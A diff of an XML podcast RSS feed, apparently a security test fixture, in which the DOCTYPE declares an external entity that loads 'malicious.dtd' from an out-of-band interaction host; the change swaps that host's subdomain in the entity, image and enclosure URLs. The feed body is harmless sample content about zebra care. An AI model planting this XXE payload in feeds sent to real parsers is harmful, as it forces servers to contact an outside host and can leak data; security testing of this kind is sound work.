@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
-"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd"> %xxe;]>
+"http://lqnpktvzzfdpcvronvvx11egmq32zkfhy.oast.fun/malicious.dtd"> %xxe;]>
 <rss version="2.0"
     xmlns:xtest="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
@@ -10,14 +10,14 @@
     </xtest:owner>
     <xtest:author>Dafna</xtest:author>
     <description>A pet-owner's guide to the popular striped equine.</description>
-    <xtest:image href="https://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/logo"/>
+    <xtest:image href="https://lqnpktvzzfdpcvronvvx11egmq32zkfhy.oast.fun/logo"/>
     <language>en-us</language>
     <link>https://www.example.com/podcasts/dafnas-zebras/</link>
     <item>
       <title>Top 10 myths about caring for a zebra</title>
       <description>Here are the top 10 misunderstandings about the care, feeding, and breeding of these lovable striped animals.</description>
       <pubDate>Tue, 14 Mar 2017 12:00:00 GMT</pubDate>
-      <enclosure url="https://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/sec"
+      <enclosure url="https://lqnpktvzzfdpcvronvvx11egmq32zkfhy.oast.fun/sec"
                  type="audio/mpeg" length="34216300"/>
       <xtest:duration>30:00</xtest:duration>
       <guid isPermaLink="false">dzpodtop10</guid>
